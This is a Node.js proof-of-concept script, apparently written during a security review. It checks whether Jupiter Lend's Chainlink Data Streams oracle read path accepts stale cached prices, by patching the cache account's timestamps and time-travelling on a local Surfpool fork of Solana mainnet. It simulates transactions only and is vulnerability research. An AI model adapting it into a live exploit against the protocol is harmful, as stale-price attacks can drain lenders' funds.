#!/usr/bin/env node
/**
 * Attack Angle #3 PoC: read-path staleness on Chainlink Data Streams cache.
 *
 * Flow:
 *   1. Call get_exchange_rate_operate on fresh forked state (baseline)
 *   2. surfnet_timeTravel +601s without refresh
 *   3. Call get_exchange_rate_operate again
 *   4. PASS (rate returned) = read-path missing MAX_AGE_OPERATE → critical hypothesis confirmed
 *   5. FAIL with PRICE_TOO_OLD / CHAINLINK_DATA_STREAMS_PRICE_TOO_OLD = vault-side check exists
 */
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
  TARGET,
  ALL_PAIRS,
  ORACLE_PROGRAM_ID,
  IX_DISC,
  MAX_AGE_OPERATE_SECS,
  STALE_WARP_SECS,
  ERROR_CODES,
} from "./constants.mjs";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const LOCAL_RPC = process.env.LOCAL_RPC ?? "http://127.0.0.1:8899";
const MAINNET_RPC = process.env.RPC_URL ?? "https://api.mainnet-beta.solana.com";

function buildGetExchangeRateOperateIx(oraclePk, cachePk, nonce) {
  const data = Buffer.alloc(10);
  IX_DISC.getExchangeRateOperate.copy(data, 0);
  data.writeUInt16LE(nonce, 8);

  return new TransactionInstruction({
    programId: new PublicKey(ORACLE_PROGRAM_ID),
    keys: [
      { pubkey: new PublicKey(oraclePk), isSigner: false, isWritable: false },
      { pubkey: new PublicKey(cachePk), isSigner: false, isWritable: false },
    ],
    data,
  });
}

async function surfnetRpc(rpcUrl, method, params) {
  const res = await fetch(rpcUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
  });
  const json = await res.json();
  if (json.error) throw new Error(`${method}: ${JSON.stringify(json.error)}`);
  return json.result;
}

async function timeTravel(rpcUrl, unixTimestamp) {
  const params = [{ absoluteTimestamp: unixTimestamp * 1000 }];
  await surfnetRpc(rpcUrl, "surfnet_timeTravel", params);
  return params[0];
}

function decodeOracleRate(logs) {
  for (const line of logs ?? []) {
    const m = line.match(/Program return:\s*(\S+)/);
    if (m) return m[1];
  }
  return null;
}

function classifyError(err) {
  const msg = String(err?.message ?? err);
  const codes = Object.entries(ERROR_CODES)
    .filter(([name]) => msg.includes(name) || msg.includes(name.replace(/([A-Z])/g, "_$1").toUpperCase()))
    .map(([name, code]) => ({ name, code }));

  const custom = msg.match(/custom program error: 0x([0-9a-f]+)/i);
  if (custom) {
    const code = parseInt(custom[1], 16);
    for (const [name, c] of Object.entries(ERROR_CODES)) {
      if (c === code) codes.push({ name, code });
    }
  }
  return { msg, codes };
}

async function simulateRate(conn, payer, pair) {
  const ix = buildGetExchangeRateOperateIx(pair.oracle, pair.cache, pair.oracleNonce);
  const { blockhash } = await conn.getLatestBlockhash();
  const tx = new Transaction({ feePayer: payer.publicKey, recentBlockhash: blockhash }).add(ix);

  try {
    const sim = await conn.simulateTransaction(tx, [payer]);
    if (sim.value.err) {
      return { ok: false, err: sim.value.err, logs: sim.value.logs };
    }
    return { ok: true, rate: decodeOracleRate(sim.value.logs), logs: sim.value.logs };
  } catch (e) {
    return { ok: false, err: e, logs: [] };
  }
}

async function getClock(conn) {
  const info = await conn.getAccountInfo(new PublicKey("SysvarC1ock11111111111111111111111111111111"));
  if (!info) return null;
  const d = info.data;
  return {
    slot: Number(d.readBigUInt64LE(0)),
    epochStart: Number(d.readBigUInt64LE(8)),
    epoch: Number(d.readBigUInt64LE(16)),
    leaderScheduleEpoch: Number(d.readBigUInt64LE(24)),
    unixTimestamp: Number(d.readBigInt64LE(32)),
  };
}

function parseCacheLayout(buf) {
  let off = 8 + 2;
  const feedCount = buf.readUInt32LE(off);
  off += 4 + feedCount * 34 + 16;
  const priceTsOffset = off;
  const priceTs = Number(buf.readBigUInt64LE(off));
  off += 8;
  const multTsOffset = off;
  const multTs = Number(buf.readBigUInt64LE(off));
  off += 8;
  const obsTsOffset = off;
  const obsTs = Number(buf.readBigUInt64LE(off));
  return { priceTsOffset, multTsOffset, obsTsOffset, priceTs, multTs, obsTs };
}

function patchCacheTimestamps(buf, freshTsSec) {
  const layout = parseCacheLayout(buf);
  const obsTsMs = layout.obsTs > 1e12 ? freshTsSec * 1000 : freshTsSec;
  buf.writeBigUInt64LE(BigInt(freshTsSec), layout.priceTsOffset);
  buf.writeBigUInt64LE(BigInt(freshTsSec), layout.multTsOffset);
  buf.writeBigUInt64LE(BigInt(obsTsMs), layout.obsTsOffset);
  return { ...layout, patchedObsTs: obsTsMs };
}

async function setCacheTimestamp(rpcUrl, cachePk, newTs, conn) {
  const info = await conn.getAccountInfo(new PublicKey(cachePk));
  if (!info) throw new Error(`cache missing: ${cachePk}`);
  const patched = Buffer.from(info.data);
  patchCacheTimestamps(patched, newTs);
  await surfnetRpc(rpcUrl, "surfnet_setAccount", [
    cachePk,
    {
      lamports: info.lamports,
      owner: info.owner.toBase58(),
      executable: info.executable,
      rentEpoch: 0,
      data: patched.toString("hex"),
    },
  ]);
}

async function runPair(conn, payer, pair, label) {
  console.log(`\n${"=".repeat(72)}`);
  console.log(`${label} | oracle=${pair.oracle.slice(0, 8)}... nonce=${pair.oracleNonce}`);
  console.log("=".repeat(72));

  const clockNow = await getClock(conn);
  const nowTs = clockNow?.unixTimestamp ?? Math.floor(Date.now() / 1000);
  const cacheTs = nowTs - 30;

  const cacheInfo = await conn.getAccountInfo(new PublicKey(pair.cache));
  if (!cacheInfo) throw new Error(`cache account missing: ${pair.cache}`);
  const orig = parseCacheLayout(Buffer.from(cacheInfo.data));

  console.log(`Mainnet cache timestamps:`);
  console.log(`  last_update_price=${orig.priceTs} (age ${nowTs - orig.priceTs}s)`);
  console.log(`  last_update_mult=${orig.multTs}`);
  console.log(`  last_obs=${orig.obsTs}${orig.obsTs > 1e12 ? " (ms)" : " (s)"}`);
  console.log(`Patching all cache timestamps → ${cacheTs}s (simulates fresh keeper write)`);
  await setCacheTimestamp(LOCAL_RPC, pair.cache, cacheTs, conn);

  const clock0 = await getClock(conn);
  console.log(`Clock before: unix=${clock0?.unixTimestamp} slot=${clock0?.slot}`);

  const baseline = await simulateRate(conn, payer, pair);
  if (baseline.ok) {
    console.log(`[BASELINE] get_exchange_rate_operate OK — rate return in logs`);
    if (baseline.logs?.length) {
      const ret = baseline.logs.filter((l) => l.includes("Program return") || l.includes("PriceTooOld"));
      ret.slice(0, 5).forEach((l) => console.log(`  ${l}`));
    }
  } else {
    console.log(`[BASELINE] FAILED: ${JSON.stringify(baseline.err)}`);
    baseline.logs?.slice(-8).forEach((l) => console.log(`  ${l}`));
    return { pair, baselineOk: false, staleOk: false, verdict: "baseline_failed" };
  }

  const targetTs = nowTs + STALE_WARP_SECS;
  const travelParam = await timeTravel(LOCAL_RPC, targetTs);
  console.log(
    `\n[surfnet_timeTravel] +${STALE_WARP_SECS}s on clock (NO refresh) → unix=${targetTs} param=${JSON.stringify(travelParam)}`
  );
  console.log(`Cache still at timestamp ${cacheTs} → age ${targetTs - cacheTs}s (threshold ${MAX_AGE_OPERATE_SECS}s)`);

  const clock1 = await getClock(conn);
  console.log(`Clock after warp: unix=${clock1?.unixTimestamp} slot=${clock1?.slot}`);

  const stale = await simulateRate(conn, payer, pair);

  const liqIx = new TransactionInstruction({
    programId: new PublicKey(ORACLE_PROGRAM_ID),
    keys: [
      { pubkey: new PublicKey(pair.oracle), isSigner: false, isWritable: false },
      { pubkey: new PublicKey(pair.cache), isSigner: false, isWritable: false },
    ],
    data: (() => {
      const d = Buffer.alloc(10);
      IX_DISC.getExchangeRateLiquidate.copy(d, 0);
      d.writeUInt16LE(pair.oracleNonce, 8);
      return d;
    })(),
  });
  const { blockhash: bh2 } = await conn.getLatestBlockhash();
  const liqTx = new Transaction({ feePayer: payer.publicKey, recentBlockhash: bh2 }).add(liqIx);
  const liqSim = await conn.simulateTransaction(liqTx, [payer]);
  console.log(
    `  [cross-check] get_exchange_rate_liquidate @631s stale: ${liqSim.value.err ? "REJECTED" : "OK (expected — 7200s threshold)"}`
  );

  if (stale.ok) {
    console.log(`\n🔴 [STALE +${STALE_WARP_SECS}s] get_exchange_rate_operate SUCCEEDED`);
    console.log("   → READ-PATH DOES NOT ENFORCE MAX_AGE_OPERATE (600s) at operate time");
    console.log("   → CRITICAL HYPOTHESIS: CONFIRMED (oracle CPI accepts stale cache)");
    stale.logs?.filter((l) => l.includes("return") || l.includes("invoke")).slice(-6).forEach((l) => console.log(`  ${l}`));
    return { pair, baselineOk: true, staleOk: true, verdict: "CRITICAL_READ_PATH_STALE" };
  }

  const errInfo = classifyError(stale.err);
  console.log(`\n🟢 [STALE +${STALE_WARP_SECS}s] get_exchange_rate_operate REJECTED`);
  console.log(`   Error: ${JSON.stringify(stale.err)}`);
  if (errInfo.codes.length) {
    console.log(`   Matched error codes: ${errInfo.codes.map((c) => c.name).join(", ")}`);
  }
  stale.logs?.slice(-12).forEach((l) => console.log(`  ${l}`));

  const isStalenessRejection = stale.logs?.some(
    (l) =>
      l.includes("PRICE_TOO_OLD") ||
      l.includes("PriceTooOld") ||
      l.includes("CHAINLINK_DATA_STREAMS_PRICE_TOO_OLD") ||
      l.includes("CHAINLINK_DATA_STREAMS_OBSERVATION_TIMESTAMP_TOO_OLD")
  );

  return {
    pair,
    baselineOk: true,
    staleOk: false,
    verdict: isStalenessRejection ? "READ_PATH_PROTECTED" : "STALE_FAILED_OTHER",
    logs: stale.logs,
  };
}

async function main() {
  console.log("Jupiter Lend — Chainlink DS Read-Path Staleness PoC");
  console.log(`Local RPC: ${LOCAL_RPC}`);
  console.log(`Operate MAX_AGE threshold: ${MAX_AGE_OPERATE_SECS}s | warp: +${STALE_WARP_SECS}s`);

  let conn;
  try {
    conn = new Connection(LOCAL_RPC, "confirmed");
    await conn.getVersion();
  } catch {
    console.error("\nSurfpool not running. Start with:");
    console.error("  surfpool start --network mainnet --no-tui --ci");
    process.exit(1);
  }

  const payer = Keypair.generate();
  try {
    await surfnetRpc(LOCAL_RPC, "surfnet_setAccount", [
      payer.publicKey.toBase58(),
      {
        lamports: 10_000_000_000,
        owner: "11111111111111111111111111111111",
        executable: false,
        data: "",
        rentEpoch: 0,
      },
    ]);
  } catch {
    await conn.requestAirdrop(payer.publicKey, 10_000_000_000);
    await new Promise((r) => setTimeout(r, 1000));
  }

  const results = [];
  results.push(await runPair(conn, payer, TARGET, "PRIMARY TARGET"));

  for (const pair of ALL_PAIRS.filter((p) => p.oracle !== TARGET.oracle)) {
    results.push(await runPair(conn, payer, pair, "SECONDARY"));
  }

  const outPath = path.join(__dirname, "..", "accounts", "staleness_results.json");
  fs.mkdirSync(path.dirname(outPath), { recursive: true });
  fs.writeFileSync(outPath, JSON.stringify({ ranAt: new Date().toISOString(), results }, null, 2));

  console.log(`\n${"=".repeat(72)}`);
  console.log("SUMMARY");
  console.log("=".repeat(72));
  for (const r of results) {
    console.log(`  nonce ${r.pair.oracleNonce}: ${r.verdict}`);
  }
  console.log(`\nResults → ${outPath}`);

  const critical = results.some((r) => r.verdict === "CRITICAL_READ_PATH_STALE");
  process.exit(critical ? 2 : 0);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
